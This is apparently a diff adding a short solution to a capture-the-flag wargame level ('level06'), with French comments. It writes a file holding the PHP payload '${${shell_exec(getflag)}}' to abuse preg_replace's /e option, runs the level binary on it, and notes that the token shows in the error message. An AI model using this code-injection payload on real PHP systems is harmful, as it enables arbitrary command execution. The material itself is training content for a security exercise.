@@ -1,0 +1,7 @@
+# preg_replace avec l'option /e, remplace puis execute le code, il suffit de faire executer getflag dans cette fonction.
+
+mkdir /tmp/level06
+echo "[x ${${shell_exec(getflag)}}]" > /tmp/level06/file
+./level06 /tmp/level06/file
+
+# le token est affiche dans le message d'erreur.
